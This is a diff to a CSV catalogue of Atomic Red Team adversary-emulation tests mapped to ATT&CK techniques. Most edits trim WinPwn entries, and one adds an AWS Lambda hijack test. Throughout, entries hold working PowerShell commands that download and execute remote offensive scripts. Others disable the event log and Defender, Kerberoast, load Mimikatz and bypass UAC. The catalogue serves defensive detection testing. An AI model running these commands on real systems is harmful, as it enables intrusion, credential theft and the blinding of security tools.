+T1562.001,Impair Defenses: Disable or Modify Tools,WinPwn - Kill the event log services for stealth,7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66,Kill the event log services for stealth via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 inv-phantom -consoleoutput -noninteractive  ",powershell,,,,,,
 T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender ATP using Aliases - PowerShell,c531aa6e-9c97-4b29-afee-9b7be6fc8a64,"Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled
 in Windows settings.
@@ -14982,8 +14974,7 @@ input_arguments.domain_name.type: string
 input_arguments.domain_name.default: %USERDNSDOMAIN%
 
 "
-T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,WinPwn - Kerberoasting,78d10e20-c874-45f2-a9df-6fea0120ec27,Kerberoasting technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,WinPwn - Kerberoasting,78d10e20-c874-45f2-a9df-6fea0120ec27,Kerberoasting technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 Kerberoasting -consoleoutput -noninteractive",powershell,,,,,,
 T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,29094950-2c96-4cbd-b5e4-f7c65079678f,PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
 Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",powershell,,,,,,
@@ -15892,30 +15883,23 @@ T1082,System Information Discovery,"Environment variables discovery on freebsd, 
 T1082,System Information Discovery,Show System Integrity Protection status (MacOS),327cc050-9e99-4c8e-99b5-1d15f2fb6b96,"Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
 ",macos,,,"csrutil status
 ",sh,,,,,,
-T1082,System Information Discovery,WinPwn - winPEAS,eea1d918-825e-47dd-acc2-814d6c58c0e1,Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - winPEAS,eea1d918-825e-47dd-acc2-814d6c58c0e1,Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 winPEAS -noninteractive -consoleoutput",powershell,,,,,,
-T1082,System Information Discovery,WinPwn - itm4nprivesc,3d256a2f-5e57-4003-8eb6-64d91b1da7ce,Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - itm4nprivesc,3d256a2f-5e57-4003-8eb6-64d91b1da7ce,Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 itm4nprivesc -noninteractive -consoleoutput",powershell,,,,,,
-T1082,System Information Discovery,WinPwn - Powersploits privesc checks,345cb8e4-d2de-4011-a580-619cf5a9e2d7,Powersploits privesc checks using oldchecks function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - Powersploits privesc checks,345cb8e4-d2de-4011-a580-619cf5a9e2d7,Powersploits privesc checks using oldchecks function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 oldchecks -noninteractive -consoleoutput",powershell,,,"rm -force -recurse .\DomainRecon -ErrorAction Ignore
 rm -force -recurse .\Exploitation -ErrorAction Ignore
 rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
 rm -force -recurse .\LocalRecon -ErrorAction Ignore
 rm -force -recurse .\Vulnerabilities -ErrorAction Ignore",,,
-T1082,System Information Discovery,WinPwn - General privesc checks,5b6f39a2-6ec7-4783-a5fd-2c54a55409ed,General privesc checks using the otherchecks function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - General privesc checks,5b6f39a2-6ec7-4783-a5fd-2c54a55409ed,General privesc checks using the otherchecks function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 otherchecks -noninteractive -consoleoutput",powershell,,,,,,
-T1082,System Information Discovery,WinPwn - GeneralRecon,7804659b-fdbf-4cf6-b06a-c03e758590e8,Collect general computer informations via GeneralRecon function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - GeneralRecon,7804659b-fdbf-4cf6-b06a-c03e758590e8,Collect general computer informations via GeneralRecon function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 Generalrecon -consoleoutput -noninteractive",powershell,,,,,,
-T1082,System Information Discovery,WinPwn - Morerecon,3278b2f6-f733-4875-9ef4-bfed34244f0a,Gathers local system information using the Morerecon function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - Morerecon,3278b2f6-f733-4875-9ef4-bfed34244f0a,Gathers local system information using the Morerecon function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 Morerecon -noninteractive -consoleoutput",powershell,,,,,,
-T1082,System Information Discovery,WinPwn - RBCD-Check,dec6a0d8-bcaf-4c22-9d48-2aee59fb692b,Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1082,System Information Discovery,WinPwn - RBCD-Check,dec6a0d8-bcaf-4c22-9d48-2aee59fb692b,Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 RBCD-Check -consoleoutput -noninteractive",powershell,,,,,,
 T1082,System Information Discovery,WinPwn - PowerSharpPack - Watson searching for missing windows patches,07b18a66-6304-47d2-bad0-ef421eb2e107,PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
 Invoke-watson",powershell,,,,,,
@@ -16462,6 +16446,70 @@ input_arguments.web_shells.description: Path of Web Shell
 input_arguments.web_shells.type: path
 
 input_arguments.web_shells.default: PathToAtomicsFolder\T1505.003\src
+
+"
+T1648,Serverless Execution,Lambda Function Hijack,87a4a141-c2bb-49d1-a604-8679082d8b91,"Modify an existing Lambda function to execute arbitrary code.
+",iaas:aws,,,"Import-Module ""PathToAtomicsFolder/T1648/src/T1648-1/LambdaAttack.ps1"" -Force
+$access_key = ""#{access_key}""
+$secret_key = ""#{secret_key}""
+$session_token = ""#{session_token}""
+$aws_profile = ""#{profile}""
+$region = ""#{region}""
+Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region
+Invoke-Terraform -TerraformCommand init -TerraformDirectory ""PathToAtomicsFolder/T1648/src/T1648-1""
+Invoke-Terraform -TerraformCommand apply -TerraformDirectory ""PathToAtomicsFolder/T1648/src/T1648-1"" -TerraformVariables @(""profile=T1648-1"", ""region=$region"")
+Invoke-LambdaAttack -AWSProfile ""T1648-1"" -AWSRegion $region
+",powershell,,,"Import-Module ""PathToAtomicsFolder/T1648/src/T1648-1/LambdaAttack.ps1"" -Force
+$access_key = ""#{access_key}""
+$secret_key = ""#{secret_key}""
+$session_token = ""#{session_token}""
+$aws_profile = ""#{profile}""
+$region = ""#{region}""
+Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region
+Invoke-Terraform -TerraformCommand destroy -TerraformDirectory ""PathToAtomicsFolder/T1648/src/T1648-1"" -TerraformVariables @(""profile=T1648-1"", ""region=$region"")
+Remove-MaliciousUser -AWSProfile ""T1648-1""
+Remove-TFFiles -Path ""PathToAtomicsFolder/T1648/src/T1648-1/""
+",powershell,"dependencies.0.description: The AWS PowerShell module must be installed.
+
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AWSPowerShell -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+dependencies.0.get_prereq_command: Install-Module -Name AWSPowerShell -Force
+
+dependencies.1.description: Terraform must be installed.
+
+dependencies.1.prereq_command: terraform --version
+
+dependencies.1.get_prereq_command: Write-Host ""Terraform is required. Download it from https://www.terraform.io/downloads.html""
+
+","input_arguments.access_key.description: AWS Access Key
+
+input_arguments.access_key.type: string
+
+input_arguments.access_key.default: 
+
+input_arguments.secret_key.description: AWS Secret Key
+
+input_arguments.secret_key.type: string
+
+input_arguments.secret_key.default: 
+
+input_arguments.session_token.description: AWS Session Token
+
+input_arguments.session_token.type: string
+
+input_arguments.session_token.default: 
+
+input_arguments.profile.description: AWS profile
+
+input_arguments.profile.type: string
+
+input_arguments.profile.default: 
+
+input_arguments.region.description: AWS region to deploy the EC2 instance
+
+input_arguments.region.type: string
+
+input_arguments.region.default: us-east-2
 
 "
 T1027.002,Obfuscated Files or Information: Software Packing,Binary simply packed by UPX (linux),11c46cd8-e471-450e-acb8-52a1216ae6a4,"Copies and then runs a simple binary (just outputting ""the cake is a lie""), that was packed by UPX.
@@ -17970,8 +18018,7 @@ input_arguments.plink_file.type: path
 input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
 
 "
-T1620,Reflective Code Loading,WinPwn - Reflectively load Mimik@tz into memory,56b9589c-9170-4682-8c3d-33b86ecb5119,Reflectively load Mimik@tz into memory technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1620,Reflective Code Loading,WinPwn - Reflectively load Mimik@tz into memory,56b9589c-9170-4682-8c3d-33b86ecb5119,Reflectively load Mimik@tz into memory technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 mimiload -consoleoutput -noninteractive",powershell,,,,,,
 T1041,Exfiltration Over C2 Channel,C2 Data Exfiltration,d1253f6e-c29b-49dc-b466-2147a6191932,"Exfiltrates a file present on the victim machine to the C2 server.
 ",windows,,,"if(-not (Test-Path #{filepath})){ 
@@ -22442,8 +22489,7 @@ input_arguments.parameters.type: string
 input_arguments.parameters.default: -CheckShareAccess
 
 "
-T1135,Network Share Discovery,WinPwn - shareenumeration,987901d1-5b87-4558-a6d9-cffcabc638b8,Network share enumeration using the shareenumeration function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1135,Network Share Discovery,WinPwn - shareenumeration,987901d1-5b87-4558-a6d9-cffcabc638b8,Network share enumeration using the shareenumeration function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 shareenumeration -noninteractive -consoleoutput",powershell,,,,,,
 T1135,Network Share Discovery,Network Share Discovery via dir command,13daa2cf-195a-43df-a8bd-7dd5ffb607b5,"Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
 Upon execution avalaible network shares will be displayed in the commandline session
@@ -23477,8 +23523,7 @@ Upon successful execution a listing of users will output with their paths in AD.
 Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
 ",windows,,,"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}
 ",powershell,False,,,,,
-T1087.002,Account Discovery: Domain Account,WinPwn - generaldomaininfo,ce483c35-c74b-45a7-a670-631d1e69db3d,Gathers general domain information using the generaldomaininfo function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1087.002,Account Discovery: Domain Account,WinPwn - generaldomaininfo,ce483c35-c74b-45a7-a670-631d1e69db3d,Gathers general domain information using the generaldomaininfo function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 generaldomaininfo -noninteractive -consoleoutput",powershell,,,,,,
 T1087.002,Account Discovery: Domain Account,Kerbrute - userenum,f450461c-18d1-4452-9f0d-2c42c3f08624,Enumerates active directory usernames using the userenum function of Kerbrute,windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
 .\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""",powershell,,,,powershell,"dependencies.0.description: kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads.
@@ -24461,8 +24506,7 @@ input_arguments.binary_to_execute.default: C:\Windows\System32\cmd.exe
 T1120,Peripheral Device Discovery,Win32_PnPEntity Hardware Inventory,2cb4dbf2-2dca-4597-8678-4d39d207a3a5,Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity,windows,,,"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
 $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
 @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt",powershell,,,Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore,,,
-T1120,Peripheral Device Discovery,WinPwn - printercheck,cb6e76ca-861e-4a7f-be08-564caa3e6f75,Search for printers / potential vulns using printercheck function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1120,Peripheral Device Discovery,WinPwn - printercheck,cb6e76ca-861e-4a7f-be08-564caa3e6f75,Search for printers / potential vulns using printercheck function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 printercheck -noninteractive -consoleoutput",powershell,,,,,,
 T1120,Peripheral Device Discovery,Peripheral Device Discovery via fsutil,424e18fd-48b8-4201-8d3a-bf591523a686,Performs pheripheral device discovery utilizing fsutil to list all drives.,windows,,,fsutil fsinfo drives,command_prompt,,,,,,
 T1120,Peripheral Device Discovery,Get Printer Device List via PowerShell Command,5c876daf-db1e-41cf-988d-139a7443ccd4,"This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to 
@@ -26567,11 +26611,9 @@ Turla has used the /z and /v parameters: https://www.welivesecurity.com/wp-conte
 ",windows,,,"gpresult /z
 ",command_prompt,False,,,,,
 T1615,Group Policy Discovery,Get-DomainGPO to display group policy information via PowerView,4e524c4e-0e02-49aa-8df5-93f3f7959b9f,Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.,windows,,,"powershell -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO""",powershell,True,,,,,
-T1615,Group Policy Discovery,WinPwn - GPOAudit,bc25c04b-841e-4965-855f-d1f645d7ab73,Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1615,Group Policy Discovery,WinPwn - GPOAudit,bc25c04b-841e-4965-855f-d1f645d7ab73,Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 GPOAudit -noninteractive -consoleoutput",powershell,,,,,,
-T1615,Group Policy Discovery,WinPwn - GPORemoteAccessPolicy,7230d01a-0a72-4bd5-9d7f-c6d472bc6a59,Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1615,Group Policy Discovery,WinPwn - GPORemoteAccessPolicy,7230d01a-0a72-4bd5-9d7f-c6d472bc6a59,Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 GPORemoteAccessPolicy -consoleoutput -noninteractive",powershell,,,,,,
 T1615,Group Policy Discovery,MSFT Get-GPO Cmdlet,52778a8f-a10b-41a4-9eae-52ddb74072bf,The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps,windows,,,Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output},powershell,True,,del $env:temp\GPO_Output.txt -erroraction silentlycontinue,powershell,"dependencies.0.description: Add Rsat.ActiveDirectory.DS
 dependencies.0.prereq_command: if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }
@@ -27453,14 +27495,11 @@ input_arguments.uacme_exe.type: path
 input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe
 
 "
-T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Magic,964d8bf8-37bc-4fd3-ba36-ad13761ebbcc,UAC bypass using Magic technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Magic,964d8bf8-37bc-4fd3-ba36-ad13761ebbcc,UAC bypass using Magic technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic",powershell,,,,,,
-T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass ccmstp technique,f3c145f9-3c8d-422c-bd99-296a17a8f567,UAC bypass using ccmstp technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass ccmstp technique,f3c145f9-3c8d-422c-bd99-296a17a8f567,UAC bypass using ccmstp technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 UACBypass -noninteractive -command ""C:\windows\system32\calc.exe"" -technique ccmstp",powershell,,,,,,
-T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass DiskCleanup technique,1ed67900-66cd-4b09-b546-2a0ef4431a0c,UAC bypass using DiskCleanup technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass DiskCleanup technique,1ed67900-66cd-4b09-b546-2a0ef4431a0c,UAC bypass using DiskCleanup technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup",powershell,,,,,,
 T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass DccwBypassUAC technique,2b61977b-ae2d-4ae4-89cb-5c36c89586be,UAC Bypass DccwBypassUAC technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),powershell,,,,,,
 T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,251c5936-569f-42f4-9ac2-87a173b9e9b8,"Disable User Account Conrol (UAC) for admin by setting the registry key 
